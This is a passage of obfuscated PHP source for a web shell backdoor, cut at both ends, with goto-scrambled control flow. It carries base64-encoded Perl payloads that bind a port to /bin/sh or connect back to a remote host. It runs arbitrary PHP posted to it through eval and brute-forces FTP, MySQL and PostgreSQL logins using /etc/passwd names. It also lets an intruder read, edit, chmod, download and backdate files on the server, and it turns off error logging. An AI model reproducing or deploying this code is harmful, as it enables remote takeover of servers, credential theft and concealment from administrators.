            }
        }
        goto deacc;
        Ddd1e:
        echo "<br/><table width=100% cellpadding=2 cellspacing=0>";
        goto c82dd;
        deacc:
        if (@$_POST['p1'] == 'loadfile') {
            $file = $db->loadFile($_POST['p2']);
            echo '<br/><pre class=ml1>' . htmlspecialchars($file['file']) . '</pre>';
        }
        goto fed99;
        fed99:
    } else {
        echo htmlspecialchars($db->error());
    }
    goto B333f;
    F4c70:
    yUoJQHeader();
    goto A3473;
    d7118:
    yUoJQFooter();
    goto e9f69;
    b21d3:
    if (@$_POST['type'] == 'mysql') {
        echo 'selected';
    }
    goto D3308;
    B8f89:
    echo ">PostgreSql</option></select></td>\r\n<td><input type=text name=sql_host value=\"" . (empty($_POST['sql_host']) ? 'localhost' : htmlspecialchars($_POST['sql_host'])) . "\"></td>\r\n<td><input type=text name=sql_login value=\"" . (empty($_POST['sql_login']) ? 'root' : htmlspecialchars($_POST['sql_login'])) . "\"></td>\r\n<td><input type=text name=sql_pass value=\"" . (empty($_POST['sql_pass']) ? '' : htmlspecialchars($_POST['sql_pass'])) . "\"></td><td>";
    goto ea77b;
    e9f69:
}
goto Af554;
ac6ac:
@ini_set('log_errors', 0);
goto D02df;
d791a:
function yUoJQPermsColor($f)
{
    if (!@is_readable($f)) {
        return '<font color=#FF0000>' . yUoJQPerms(@fileperms($f)) . '</font>';
    } elseif (!@is_writable($f)) {
        return '<font color=white>' . yUoJQPerms(@fileperms($f)) . '</font>';
    } else {
        return '<font color=#25ff00>' . yUoJQPerms(@fileperms($f)) . '</font>';
    }
}
goto a696f;
Dc1af:
$default_action = 'FilesMan';
goto e7b61;
Afb35:
if (!function_exists("posix_getpwuid") && strpos($GLOBALS['disable_functions'], 'posix_getpwuid') === false) {
    function posix_getpwuid($p)
    {
        return false;
    }
}
goto df897;
F52b3:
@set_time_limit(0);
goto dd1d4;
Af554:
function actionNetwork()
{
    goto fc745;
    E8281:
    echo "<h1>Network tools</h1><div class=content>\r\n\t<form name='nfp' onSubmit=\"g(null,null,'bpp',this.port.value);return false;\">\r\n\t<span>Bind port to /bin/sh [perl]</span><br/>\r\n\tPort: <input type='text' name='port' value='31337'> <input type=submit value='>>'>\r\n\t</form>\r\n\t<form name='nfp' onSubmit=\"g(null,null,'bcp',this.server.value,this.port.value);return false;\">\r\n\t<span>Back-connect  [perl]</span><br/>\r\n\tServer: <input type='text' name='server' value='" . $_SERVER['REMOTE_ADDR'] . "'> Port: <input type='text' name='port' value='31337'> <input type=submit value='>>'>\r\n\t</form><br>";
    goto Ef540;
    A733c:
    echo '</div>';
    goto b0bf2;
    ce625:
    $bind_port_p = "IyEvdXNyL2Jpbi9wZXJsDQokU0hFTEw9Ii9iaW4vc2ggLWkiOw0KaWYgKEBBUkdWIDwgMSkgeyBleGl0KDEpOyB9DQp1c2UgU29ja2V0Ow0Kc29ja2V0KFMsJlBGX0lORVQsJlNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCd0Y3AnKSkgfHwgZGllICJDYW50IGNyZWF0ZSBzb2NrZXRcbiI7DQpzZXRzb2Nrb3B0KFMsU09MX1NPQ0tFVCxTT19SRVVTRUFERFIsMSk7DQpiaW5kKFMsc29ja2FkZHJfaW4oJEFSR1ZbMF0sSU5BRERSX0FOWSkpIHx8IGRpZSAiQ2FudCBvcGVuIHBvcnRcbiI7DQpsaXN0ZW4oUywzKSB8fCBkaWUgIkNhbnQgbGlzdGVuIHBvcnRcbiI7DQp3aGlsZSgxKSB7DQoJYWNjZXB0KENPTk4sUyk7DQoJaWYoISgkcGlkPWZvcmspKSB7DQoJCWRpZSAiQ2Fubm90IGZvcmsiIGlmICghZGVmaW5lZCAkcGlkKTsNCgkJb3BlbiBTVERJTiwiPCZDT05OIjsNCgkJb3BlbiBTVERPVVQsIj4mQ09OTiI7DQoJCW9wZW4gU1RERVJSLCI+JkNPTk4iOw0KCQlleGVjICRTSEVMTCB8fCBkaWUgcHJpbnQgQ09OTiAiQ2FudCBleGVjdXRlICRTSEVMTFxuIjsNCgkJY2xvc2UgQ09OTjsNCgkJZXhpdCAwOw0KCX0NCn0=";
    goto E8281;
    B06b7:
    $back_connect_p = "IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGlhZGRyPWluZXRfYXRvbigkQVJHVlswXSkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRBUkdWWzFdLCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgnL2Jpbi9zaCAtaScpOw0KY2xvc2UoU1RESU4pOw0KY2xvc2UoU1RET1VUKTsNCmNsb3NlKFNUREVSUik7";
    goto ce625;
    b0bf2:
    yUoJQFooter();
    goto E06ec;
    Ef540:
    if (isset($_POST['p1'])) {
        goto bb638;
        bb638:
        function cf($f, $t)
        {
            $w = @fopen($f, "w") or @function_exists('file_put_contents');
            if ($w) {
                @fwrite($w, @base64_decode($t));
                @fclose($w);
            }
        }
        goto f9d52;
        f9d52:
        if ($_POST['p1'] == 'bpp') {
            goto Aee68;
            e8ce6:
            sleep(1);
            goto Efaea;
            Efaea:
            echo "<pre class=ml1>{$out}\n" . yUoJQEx("ps aux | grep bp.pl") . "</pre>";
            goto Dc397;
            fc28f:
            $out = yUoJQEx("perl /tmp/bp.pl " . $_POST['p2'] . " 1>/dev/null 2>&1 &");
            goto e8ce6;
            Aee68:
            cf("/tmp/bp.pl", $bind_port_p);
            goto fc28f;
            Dc397:
            unlink("/tmp/bp.pl");
            goto aabad;
            aabad:
        }
        goto f5c36;
        f5c36:
        if ($_POST['p1'] == 'bcp') {
            goto ee722;
            D433f:
            sleep(1);
            goto b0ebb;
            ee722:
            cf("/tmp/bc.pl", $back_connect_p);
            goto b8a73;
            b0ebb:
            echo "<pre class=ml1>{$out}\n" . yUoJQEx("ps aux | grep bc.pl") . "</pre>";
            goto Cb35c;
            Cb35c:
            unlink("/tmp/bc.pl");
            goto F9916;
            b8a73:
            $out = yUoJQEx("perl /tmp/bc.pl " . $_POST['p2'] . " " . $_POST['p3'] . " 1>/dev/null 2>&1 &");
            goto D433f;
            F9916:
        }
        goto B7e65;
        B7e65:
    }
    goto A733c;
    fc745:
    yUoJQHeader();
    goto B06b7;
    E06ec:
}
goto c4c0c;
a696f:
function yUoJQScandir($dir)
{
    if (function_exists("scandir")) {
        return scandir($dir);
    } else {
        goto ca3e9;
        ca3e9:
        $dh = opendir($dir);
        goto db08d;
        e0807:
        D0907:
        goto Ff4fe;
        db08d:
        C80c1:
        goto eb244;
        Ebb13:
        goto C80c1;
        goto e0807;
        Ff4fe:
        return $files;
        goto B73f6;
        d4f8f:
        $files[] = $filename;
        goto Ebb13;
        eb244:
        if (!(false !== ($filename = readdir($dh)))) {
            goto D0907;
        }
        goto d4f8f;
        B73f6:
    }
}
goto Fd6f4;
aa930:
function actionBruteforce()
{
    goto Be92a;
    Be92a:
    yUoJQHeader();
    goto Cc6b9;
    Cc6b9:
    if (isset($_POST['proto'])) {
        goto ed5e0;
        D8934:
        if ($_POST['type'] == 1) {
            $temp = @file('/etc/passwd');
            if (is_array($temp)) {
                foreach ($temp as $line) {
                    goto C4007;
                    C4007:
                    $line = explode(":", $line);
                    goto Ce58f;
                    Ad64e:
                    if (@$_POST['reverse']) {
                        goto C067b;
                        C067b:
                        $tmp = "";
                        goto Bb257;
                        cbd3c:
                        aa814:
                        goto f7429;
                        Ef38a:
                        --$i;
                        goto cadd1;
                        f7429:
                        ++$attempts;
                        goto a9de0;
                        f07c7:
                        F97f2:
                        goto Bfd46;
                        D5485:
                        e59c2:
                        goto Ef38a;
                        Bfd46:
                        if (!($i >= 0)) {
                            goto aa814;
                        }
                        goto Fc9f1;
                        Bb257:
                        $i = strlen($line[0]) - 1;
                        goto f07c7;
                        a9de0:
                        if (yUoJQBruteForce(@$server[0], @$server[1], $line[0], $tmp)) {
                            $success++;
                            echo '<b>' . htmlspecialchars($line[0]) . '</b>:' . htmlspecialchars($tmp);
                        }
                        goto B8955;
                        cadd1:
                        goto F97f2;
                        goto cbd3c;
                        Fc9f1:
                        $tmp .= $line[0][$i];
                        goto D5485;
                        B8955:
                    }
                    goto Cdfd3;
                    Cdfd3:
                    fc965:
                    goto d1dae;
                    Ce58f:
                    ++$attempts;
                    goto B0dab;
                    B0dab:
                    if (yUoJQBruteForce(@$server[0], @$server[1], $line[0], $line[0])) {
                        $success++;
                        echo '<b>' . htmlspecialchars($line[0]) . '</b>:' . htmlspecialchars($line[0]) . '<br>';
                    }
                    goto Ad64e;
                    d1dae:
                }
                Db10e:
            }
        } elseif ($_POST['type'] == 2) {
            $temp = @file($_POST['dict']);
            if (is_array($temp)) {
                foreach ($temp as $line) {
                    goto De516;
                    bca79:
                    ++$attempts;
                    goto C66ad;
                    eb852:
                    e01e8:
                    goto b83fb;
                    De516:
                    $line = trim($line);
                    goto bca79;
                    C66ad:
                    if (yUoJQBruteForce($server[0], @$server[1], $_POST['login'], $line)) {
                        $success++;
                        echo '<b>' . htmlspecialchars($_POST['login']) . '</b>:' . htmlspecialchars($line) . '<br>';
                    }
                    goto eb852;
                    b83fb:
                }
                ae2b9:
            }
        }
        goto ff6c8;
        F5296:
        $success = 0;
        goto b3437;
        ff6c8:
        echo "<span>Attempts:</span> {$attempts} <span>Success:</span> {$success}</div><br>";
        goto b516a;
        ace7d:
        $server = explode(":", $_POST['server']);
        goto D8934;
        b3437:
        $attempts = 0;
        goto ace7d;
        ed5e0:
        echo '<h1>Results</h1><div class=content><span>Type:</span> ' . htmlspecialchars($_POST['proto']) . ' <span>Server:</span> ' . htmlspecialchars($_POST['server']) . '<br>';
        goto Aa687;
        Aa687:
        if ($_POST['proto'] == 'ftp') {
            function yUoJQBruteForce($ip, $port, $login, $pass)
            {
                goto d2062;
                b7982:
                if (!$fp) {
                    return false;
                }
                goto A1b25;
                D377c:
                return $res;
                goto cf585;
                d2062:
                $fp = @ftp_connect($ip, $port ? $port : 21);
                goto b7982;
                b71d8:
                @ftp_close($fp);
                goto D377c;
                A1b25:
                $res = @ftp_login($fp, $login, $pass);
                goto b71d8;
                cf585:
            }
        } elseif ($_POST['proto'] == 'mysql') {
            function yUoJQBruteForce($ip, $port, $login, $pass)
            {
                goto ab978;
                ab978:
                $res = @mysql_connect($ip . ':' . ($port ? $port : 3306), $login, $pass);
                goto Ef7b6;
                Ef7b6:
                @mysql_close($res);
                goto e0fa3;
                e0fa3:
                return $res;
                goto f977b;
                f977b:
            }
        } elseif ($_POST['proto'] == 'pgsql') {
            function yUoJQBruteForce($ip, $port, $login, $pass)
            {
                goto ab776;
                cc58d:
                @pg_close($res);
                goto Aaa95;
                ab776:
                $str = "host='" . $ip . "' port='" . $port . "' user='" . $login . "' password='" . $pass . "' dbname=postgres";
                goto F11c9;
                Aaa95:
                return $res;
                goto b9541;
                F11c9:
                $res = @pg_connect($str);
                goto cc58d;
                b9541:
            }
        }
        goto F5296;
        b516a:
    }
    goto Bf865;
    a9ff9:
    yUoJQFooter();
    goto C3871;
    ede02:
    echo '</div><br>';
    goto a9ff9;
    Bf865:
    echo '<h1>Bruteforce</h1><div class=content><table><form method=post><tr><td><span>Type</span></td>' . '<td><select name=proto><option value=ftp>FTP</option><option value=mysql>MySql</option><option value=pgsql>PostgreSql</option></select></td></tr><tr><td>' . '<input type=hidden name=c value="' . htmlspecialchars($GLOBALS['cwd']) . '">' . '<input type=hidden name=a value="' . htmlspecialchars($_POST['a']) . '">' . '<input type=hidden name=charset value="' . htmlspecialchars($_POST['charset']) . '">' . '<span>Server:port</span></td>' . '<td><input type=text name=server value="127.0.0.1"></td></tr>' . '<tr><td><span>Brute type</span></td>' . '<td><label><input type=radio name=type value="1" checked> /etc/passwd</label></td></tr>' . '<tr><td></td><td><label style="padding-left:15px"><input type=checkbox name=reverse value=1 checked> reverse (login -> nigol)</label></td></tr>' . '<tr><td></td><td><label><input type=radio name=type value="2"> Dictionary</label></td></tr>' . '<tr><td></td><td><table style="padding-left:15px"><tr><td><span>Login</span></td>' . '<td><input type=text name=login value="root"></td></tr>' . '<tr><td><span>Dictionary</span></td>' . '<td><input type=text name=dict value="' . htmlspecialchars($GLOBALS['cwd']) . 'passwd.dic"></td></tr></table>' . '</td></tr><tr><td></td><td><input type=submit value=">>"></td></tr></form></table>';
    goto ede02;
    C3871:
}
goto A3985;
e1763:
@ini_set('error_log', NULL);
goto ac6ac;
e69e6:
$home_cwd = @getcwd();
goto f7b97;
E05ee:
$disable_functions = @ini_get('disable_functions');
goto e69e6;
c4c0c:
function actionRC()
{
    if (!@$_POST['p1']) {
        $a = array("uname" => php_uname(), "php_version" => phpversion(), "yUoJQ_version" => yUoJQ_VERSION, "safemode" => @ini_get('safe_mode'));
        echo serialize($a);
    } else {
        eval($_POST['p1']);
    }
}
goto ff23d;
ecf86:
$color = "#df5";
goto Dc1af;
Cb4b5:
$default_charset = 'Windows-1251';
goto E6c7e;
b91b5:
function yUoJQsetcookie($k, $v)
{
    $_COOKIE[$k] = $v;
    setcookie($k, $v);
}
goto B415c;
b7878:
function yUoJQFooter()
{
    $is_writable = is_writable($GLOBALS['cwd']) ? " <font color='green'>(Writeable)</font>" : " <font color=red>(Not writable)</font>";
    echo "\r\n</div>\r\n<table class=info id=toolsTbl cellpadding=3 cellspacing=0 width=100%  style='border-top:2px solid #333;border-bottom:2px solid #333;'>\r\n\t<tr>\r\n\t\t<td><form onsubmit='g(null,this.c.value,\"\");return false;'><span>Change dir:</span><br><input class='toolsInp' type=text name=c value='" . htmlspecialchars($GLOBALS['cwd']) . "'><input type=submit value='>>'></form></td>\r\n\t\t<td><form onsubmit=\"g('FilesTools',null,this.f.value);return false;\"><span>Read file:</span><br><input class='toolsInp' type=text name=f><input type=submit value='>>'></form></td>\r\n\t</tr><tr>\r\n\t\t<td><form onsubmit=\"g('FilesMan',null,'mkdir',this.d.value);return false;\"><span>Make dir:</span>{$is_writable}<br><input class='toolsInp' type=text name=d><input type=submit value='>>'></form></td>\r\n\t\t<td><form onsubmit=\"g('FilesTools',null,this.f.value,'mkfile');return false;\"><span>Make file:</span>{$is_writable}<br><input class='toolsInp' type=text name=f><input type=submit value='>>'></form></td>\r\n\t</tr><tr>\r\n\t\t<td><form onsubmit=\"g('Console',null,this.c.value);return false;\"><span>Execute:</span><br><input class='toolsInp' type=text name=c value=''><input type=submit value='>>'></form></td>\r\n\t\t<td><form method='post' ENCTYPE='multipart/form-data'>\r\n\t\t<input type=hidden name=a value='FilesMAn'>\r\n\t\t<input type=hidden name=c value='" . $GLOBALS['cwd'] . "'>\r\n\t\t<input type=hidden name=p1 value='uploadFile'>\r\n\t\t<input type=hidden name=charset value='" . (isset($_POST['charset']) ? $_POST['charset'] : '') . "'>\r\n\t\t<span>Upload file:</span>{$is_writable}<br><input class='toolsInp' type=file name=f><input type=submit value='>>'></form><br  ></td>\r\n\t</tr></table></div></body></html>";
}
goto Afb35;
f42d0:
function actionLogout()
{
    setcookie(md5($_SERVER['HTTP_HOST']), '', time() - 3600);
    die('bye!');
}
goto d77a6;
dd1d4:
if (get_magic_quotes_gpc()) {
    goto E21a7;
    E21a7:
    function yUoJQstripslashes($array)
    {
        return is_array($array) ? array_map('yUoJQstripslashes', $array) : stripslashes($array);
    }
    goto cfd4e;
    cfd4e:
    $_POST = yUoJQstripslashes($_POST);
    goto C613c;
    C613c:
    $_COOKIE = yUoJQstripslashes($_COOKIE);
    goto B83a2;
    B83a2:
}
goto c27d1;
Ef782:
function actionPhp()
{
    goto E70a3;
    B4af0:
    echo '</pre></div>';
    goto C162f;
    B8a25:
    if (!empty($_POST['p1'])) {
        goto e3472;
        Fb2a3:
        echo htmlspecialchars(ob_get_clean());
        goto Be023;
        e3472:
        ob_start();
        goto F850b;
        F850b:
        eval($_POST['p1']);
        goto Fb2a3;
        Be023:
    }
    goto B4af0;
    afe56:
    if (empty($_POST['ajax']) && !empty($_POST['p1'])) {
        yUoJQsetcookie(md5($_SERVER['HTTP_HOST']) . 'ajax', 0);
    }
    goto Dbd3f;
    E70a3:
    if (isset($_POST['ajax'])) {
        goto cbc55;
        cbc55:
        yUoJQsetcookie(md5($_SERVER['HTTP_HOST']) . 'ajax', true);
        goto Cbc67;
        Cbc67:
        ob_start();
        goto Bc3ca;
        Fd2ee:
        exit;
        goto e9d6c;
        Bc3ca:
        eval($_POST['p1']);
        goto b656a;
        abca6:
        echo strlen($temp), "\n", $temp;
        goto Fd2ee;
        b656a:
        $temp = "document.getElementById('PhpOutput').style.display='';document.getElementById('PhpOutput').innerHTML='" . addcslashes(htmlspecialchars(ob_get_clean()), "\n\r\t\\'\x00") . "';\n";
        goto abca6;
        e9d6c:
    }
    goto afe56;
    C162f:
    yUoJQFooter();
    goto d0a43;
    fe7a3:
    echo '<h1>Execution PHP-code</h1><div class=content><form name=pf method=post onsubmit="if(this.ajax.checked){a(\'Php\',null,this.code.value);}else{g(\'Php\',null,this.code.value,\'\');}return false;"><textarea name=code class=bigarea id=PhpCode>' . (!empty($_POST['p1']) ? htmlspecialchars($_POST['p1']) : '') . '</textarea><input type=submit value=Eval style="margin-top:5px">';
    goto D827f;
    Dbd3f:
    yUoJQHeader();
    goto f2dc3;
    f2dc3:
    if (isset($_POST['p2']) && $_POST['p2'] == 'info') {
        goto f23ce;
        d0ab7:
        ob_start();
        goto eb3b4;
        f1fe3:
        echo str_replace('<h1', '<h2', $tmp) . '</div><br>';
        goto e4df1;
        a5a0e:
        $tmp = preg_replace(array('!(body|a:\\w+|body, td, th, h1, h2) {.*}!msiU', '!td, th {(.*)}!msiU', '!<img[^>]+>!msiU'), array('', '.e, .v, .h, .h th {$1}', ''), $tmp);
        goto f1fe3;
        a877a:
        $tmp = ob_get_clean();
        goto a5a0e;
        f23ce:
        echo '<h1>PHP info</h1><div class=content><style>.p {color:#000;}</style>';
        goto d0ab7;
        eb3b4:
        phpinfo();
        goto a877a;
        e4df1:
    }
    goto fe7a3;
    D827f:
    echo ' <input type=checkbox name=ajax value=1 ' . ($_COOKIE[md5($_SERVER['HTTP_HOST']) . 'ajax'] ? 'checked' : '') . '> send using AJAX</form><pre id=PhpOutput style="' . (empty($_POST['p1']) ? 'display:none;' : '') . 'margin-top:5px;" class=ml1>';
    goto B8a25;
    d0a43:
}
goto Bc1e0;
c0c45:
function actionFilesTools()
{
    goto de9d9;
    c3170:
    if (empty($_POST['p2'])) {
        $_POST['p2'] = 'view';
    }
    goto De718;
    a4bbb:
    echo '<span>Name:</span> ' . htmlspecialchars(@basename($_POST['p1'])) . ' <span>Size:</span> ' . (is_file($_POST['p1']) ? yUoJQViewSize(filesize($_POST['p1'])) : '-') . ' <span>Permission:</span> ' . yUoJQPermsColor($_POST['p1']) . ' <span>Owner/Group:</span> ' . $uid['name'] . '/' . $gid['name'] . '<br>';
    goto C4877;
    Ae055:
    foreach ($m as $v) {
        echo '<a href=# onclick="g(null,null,\'' . urlencode($_POST['p1']) . '\',\'' . strtolower($v) . '\')">' . (strtolower($v) == @$_POST['p2'] ? '<b>[ ' . $v . ' ]</b>' : $v) . '</a> ';
        da4cb:
    }
    goto bd200;
    a46e8:
    echo '<h1>File tools</h1><div class=content>';
    goto e660a;
    E2d78:
    echo '</div>';
    goto ff8f4;
    A33c0:
    De7eb:
    goto E2d78;
    C8f7d:
    bccfd:
    goto A33c0;
    e660a:
    if (!file_exists(@$_POST['p1'])) {
        goto c4961;
        c24c9:
        return;
        goto B968e;
        c4961:
        echo 'File not exists';
        goto cfa41;
        cfa41:
        yUoJQFooter();
        goto c24c9;
        B968e:
    }
    goto Ced0c;
    cab0b:
    switch ($_POST['p2']) {
        case 'view':
            goto D9ee0;
            c4e0a:
            $fp = @fopen($_POST['p1'], 'r');
            goto B71b7;
            B71b7:
            if ($fp) {
                goto a69ae;
                e5549:
                echo htmlspecialchars(@fread($fp, 1024));
                goto f7bad;
                a69ae:
                cbc9c:
                goto c1d26;
                bf09e:
                @fclose($fp);
                goto Efbbb;
                B8aa1:
                C228d:
                goto bf09e;
                f7bad:
                goto cbc9c;
                goto B8aa1;
                c1d26:
                if (@feof($fp)) {
                    goto C228d;
                }
                goto e5549;
                Efbbb:
            }
            goto A93f9;
            E39fe:
            goto De7eb;
            goto D7f1a;
            A93f9:
            echo '</pre>';
            goto E39fe;
            D9ee0:
            echo '<pre class=ml1>';
            goto c4e0a;
            D7f1a:
        case 'highlight':
            if (@is_readable($_POST['p1'])) {
                goto Dcf8e;
                d6677:
                $code = @highlight_file($_POST['p1'], true);
                goto F6026;
                Dcf8e:
                echo '<div class=ml1 style="background-color: #e1e1e1;color:black;">';
                goto d6677;
                F6026:
                echo str_replace(array('<span ', '</span>'), array('<font ', '</font>'), $code) . '</div>';
                goto cea81;
                cea81:
            }
            goto De7eb;
        case 'chmod':
            goto Faf56;
            f09bd:
            echo '<script>p3_="";</script><form onsubmit="g(null,null,\'' . urlencode($_POST['p1']) . '\',null,this.chmod.value);return false;"><input type=text name=chmod value="' . substr(sprintf('%o', fileperms($_POST['p1'])), -4) . '"><input type=submit value=">>"></form>';
            goto b9abd;
            F7cf1:
            clearstatcache();
            goto f09bd;
            b9abd:
            goto De7eb;
            goto F634f;
            Faf56:
            if (!empty($_POST['p3'])) {
                goto D53ab;
                f56e3:
                $perms += (int) $_POST['p3'][$i] * pow(8, strlen($_POST['p3']) - $i - 1);
                goto a2cb3;
                F9e29:
                if (!($i >= 0)) {
                    goto B5205;
                }
                goto f56e3;
                c7a99:
                B5205:
                goto E7d06;
                c824c:
                goto C554e;
                goto c7a99;
                a2cb3:
                a9877:
                goto D0315;
                D0315:
                --$i;
                goto c824c;
                E7d06:
                if (!@chmod($_POST['p1'], $perms)) {
                    echo 'Can\'t set permissions!<br><script>document.mf.p3.value="";</script>';
                }
                goto Df2fb;
                D53ab:
                $perms = 0;
                goto F5db4;
                F5db4:
                $i = strlen($_POST['p3']) - 1;
                goto Be7b4;
                Be7b4:
                C554e:
                goto F9e29;
                Df2fb:
            }
            goto F7cf1;
            F634f:
        case 'edit':
            goto e88f3;
            e88f3:
            if (!is_writable($_POST['p1'])) {
                echo 'File isn\'t writeable';
                goto De7eb;
            }
            goto d84ce;
            d59ba:
            $fp = @fopen($_POST['p1'], 'r');
            goto Eaa70;
            d84ce:
            if (!empty($_POST['p3'])) {
                goto F3029;
                c0e57:
                $_POST['p3'] = substr($_POST['p3'], 1);
                goto b3a91;
                F3029:
                $time = @filemtime($_POST['p1']);
                goto c0e57;
                b3a91:
                $fp = @fopen($_POST['p1'], "w");
                goto D84cf;
                D84cf:
                if ($fp) {
                    goto cf309;
                    Af05b:
                    @touch($_POST['p1'], $time, $time);
                    goto fd0c7;
                    cf309:
                    @fwrite($fp, $_POST['p3']);
                    goto Bdee2;
                    a53d9:
                    echo 'Saved!<br><script>p3_="";</script>';
                    goto Af05b;
                    Bdee2:
                    @fclose($fp);
                    goto a53d9;
                    fd0c7:
                }
                goto b695a;
                b695a:
            }
            goto F8693;
            f8675:
            echo '</textarea><input type=submit value=">>"></form>';
            goto A7321;
            Eaa70:
            if ($fp) {
                goto F442f;
                C95d1:
                echo htmlspecialchars(@fread($fp, 1024));
                goto Babe9;
                F15cd:
                @fclose($fp);
                goto f7069;
                F442f:
                aa015:
                goto f6af9;
                f6d6c:
                cc59b:
                goto F15cd;
                f6af9:
                if (@feof($fp)) {
                    goto cc59b;
                }
                goto C95d1;
                Babe9:
                goto aa015;
                goto f6d6c;
                f7069:
            }
            goto f8675;
            A7321:
            goto De7eb;
            goto ff5b3;
            F8693:
            echo '<form onsubmit="g(null,null,\'' . urlencode($_POST['p1']) . '\',null,\'1\'+this.text.value);return false;"><textarea name=text class=bigarea>';
            goto d59ba;
            ff5b3:
        case 'hexdump':
            goto Fb792;
            Ff4d6:
            echo '<table cellspacing=1 cellpadding=5 bgcolor=#222222><tr><td bgcolor=#333333><span style="font-weight: normal;"><pre>' . $h[0] . '</pre></span></td><td bgcolor=#282828><pre>' . $h[1] . '</pre></td><td bgcolor=#333333><pre>' . htmlspecialchars($h[2]) . '</pre></td></tr></table>';
            goto C2602;
            D2f53:
            ++$i;
            goto Ccc1d;
            E25e9:
            $n++;
            goto f5a9e;
            C2602:
            goto De7eb;
            goto C593b;
            f5a9e:
            if ($n == 32) {
                goto f6968;
                C7731:
                $h[2] .= "\n";
                goto b8890;
                f5a46:
                $h[1] .= '<br>';
                goto C7731;
                A741d:
                if ($i + 1 < $len) {
                    $h[0] .= sprintf('%08X', $i + 1) . '<br>';
                }
                goto f5a46;
                f6968:
                $n = 0;
                goto A741d;
                b8890:
            }
            goto C3a35;
            b6cee:
            $len = strlen($c);
            goto d4871;
            c7af7:
            C19b6:
            goto edd0a;
            E7ae7:
            b69a8:
            goto Ff4d6;
            d4871:
            $i = 0;
            goto c7af7;
            edd0a:
            if (!($i < $len)) {
                goto b69a8;
            }
            goto C8712;
            e71d4:
            switch (ord($c[$i])) {
                case 0:
                    $h[2] .= ' ';
                    goto Cf7f7;
                case 9:
                    $h[2] .= ' ';
                    goto Cf7f7;
                case 10:
                    $h[2] .= ' ';
                    goto Cf7f7;
                case 13:
                    $h[2] .= ' ';
                    goto Cf7f7;
                default:
                    $h[2] .= $c[$i];
                    goto Cf7f7;
            }
            goto Dc29d;
            C3a35:
            Ca752:
            goto D2f53;
            D138d:
            $n = 0;
            goto Ec023;
            A2b60:
            Cf7f7:
            goto E25e9;
            Dc29d:
            A3f29:
            goto A2b60;
            Ccc1d:
            goto C19b6;
            goto E7ae7;
            Fb792:
            $c = @file_get_contents($_POST['p1']);
            goto D138d;
            C8712:
            $h[1] .= sprintf('%02X', ord($c[$i])) . ' ';
            goto e71d4;
            Ec023:
            $h = array('00000000<br>', '', '');
            goto b6cee;
            C593b:
        case 'rename':
            goto A31b1;
            A39cc:
            goto De7eb;
            goto cd6a6;
            A31b1:
            if (!empty($_POST['p3'])) {
                if (!@rename($_POST['p1'], $_POST['p3'])) {
                    echo 'Can\'t rename!<br>';
                } else {
                    die('<script>g(null,null,"' . urlencode($_POST['p3']) . '",null,"")</script>');
                }
            }
            goto a741f;
            a741f:
            echo '<form onsubmit="g(null,null,\'' . urlencode($_POST['p1']) . '\',null,this.name.value);return false;"><input type=text name=name value="' . htmlspecialchars($_POST['p1']) . '"><input type=submit value=">>"></form>';
            goto A39cc;
            cd6a6:
        case 'touch':
            goto c213c;
            B492a:
            echo '<script>p3_="";</script><form onsubmit="g(null,null,\'' . urlencode($_POST['p1']) . '\',null,this.touch.value);return false;"><input type=text name=touch value="' . date("Y-m-d H:i:s", @filemtime($_POST['p1'])) . '"><input type=submit value=">>"></form>';
            goto C2229;
            f92e2:
            clearstatcache();
            goto B492a;
            C2229:
            goto De7eb;
            goto ee98f;
            c213c:
            if (!empty($_POST['p3'])) {
                $time = strtotime($_POST['p3']);
                if ($time) {
                    if (!touch($_POST['p1'], $time, $time)) {
                        echo 'Fail!';
                    } else {
                        echo 'Touched!';
                    }
                } else {
                    echo 'Bad time format!';
                }
            }
            goto f92e2;
            ee98f:
    }
    goto C8f7d;
    de9d9:
    if (isset($_POST['p1'])) {
        $_POST['p1'] = urldecode($_POST['p1']);
    }
    goto b1eea;
    bd200:
    E2bfb:
    goto Bd786;
    ae67f:
    if (!$uid) {
        $uid['name'] = @fileowner($_POST['p1']);
        $gid['name'] = @filegroup($_POST['p1']);
    } else {
        $gid = @posix_getgrgid(@filegroup($_POST['p1']));
    }
    goto a4bbb;
    C24c4:
    yUoJQHeader();
    goto a46e8;
    Bd786:
    echo '<br><br>';
    goto cab0b;
    De718:
    if (is_file($_POST['p1'])) {
        $m = array('View', 'Highlight', 'Download', 'Hexdump', 'Edit', 'Chmod', 'Rename', 'Touch');
    } else {
        $m = array('Chmod', 'Rename', 'Touch');
    }
    goto Ae055;
    C4877:
    echo '<span>Change time:</span> ' . date('Y-m-d H:i:s', filectime($_POST['p1'])) . ' <span>Access time:</span> ' . date('Y-m-d H:i:s', fileatime($_POST['p1'])) . ' <span>Modify time:</span> ' . date('Y-m-d H:i:s', filemtime($_POST['p1'])) . '<br><br>';
    goto c3170;
    Ced0c:
    $uid = @posix_getpwuid(@fileowner($_POST['p1']));
    goto ae67f;
    F3dce:
    if (@$_POST['p2'] == 'mkfile') {
        if (!file_exists($_POST['p1'])) {
            $fp = @fopen($_POST['p1'], 'w');
            if ($fp) {
                $_POST['p2'] = "edit";
                fclose($fp);
            }
        }
    }
    goto C24c4;
    ff8f4:
    yUoJQFooter();
    goto a20a1;
    b1eea:
    if (@$_POST['p2'] == 'download') {
        if (@is_file($_POST['p1']) && @is_readable($_POST['p1'])) {
            goto D224e;
            f3e4c:
            $fp = @fopen($_POST['p1'], "r");
            goto E2b5d;
            c49dd:
            header("Content-Disposition: attachment; filename=" . basename($_POST['p1']));
            goto Ced9c;
            E2b5d:
            if ($fp) {
                goto f0445;
                f0445:
                B0aa4:
                goto d637c;
                e4e11:
                echo @fread($fp, 1024);
                goto Adc78;
                bfc75:
                fclose($fp);
                goto e326a;
                A98b4:
                A7140:
                goto bfc75;
                d637c:
                if (@feof($fp)) {
